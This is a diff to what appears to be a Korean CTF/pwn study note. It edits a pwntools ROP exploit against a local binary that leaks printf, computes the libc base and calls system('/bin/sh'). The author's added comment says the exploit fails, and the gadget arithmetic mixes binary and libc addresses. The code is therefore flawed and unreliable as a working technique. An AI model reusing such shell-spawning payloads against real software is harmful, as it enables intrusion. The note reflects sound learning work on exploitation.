@@ -33,6 +33,7 @@ from pwn import *
 p = process('./onegadget')
 e = ELF('./onegadget')
 libc = e.libc
+rop = ROP(e)
 
 p.recvuntil(b'printf Function is at: ')
 printf_addr = int(p.recv(14), 16)
@@ -40,31 +41,35 @@ printf_addr = int(p.recv(14), 16)
 libc_base = printf_addr - libc.symbols['printf']
 system_addr = libc_base + libc.symbols['system']
 binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
+pop_rdi = libc_base + (rop.find_gadget(['pop rdi', 'ret']))[0]
 
 log.info("libc base : %s"%hex(libc_base))
 log.info("system addr : %s"%hex(system_addr))
+log.info("pop rid: %s"%hex(pop_rdi))
 
-pop_rdi = 0x0000555555555213
 
 payload = b'A'*0x20
 payload += b'B'*0x8
 payload += p64(pop_rdi)
 payload += p64(binsh)
-payload += p64(pop_rdi+1)
+#payload += p64(pop_rdi+1)
 payload += p64(system_addr)
 
 p.sendline(payload)
 
 p.interactive()
 
-
 ```
+
+익스플로잇이 되지 않는다. rop gadget은 PIE로 랜덤화되기 때문에 libc base를 같이 사용하면 안 되기 때문인가? 잘 모르겠다...ㅜㅜ
+
 
 
 
 ## problem 3-2
 
 마찬가지로 ROP 문제이다. read를 활용하여 
+
 
 
 ## problem 4
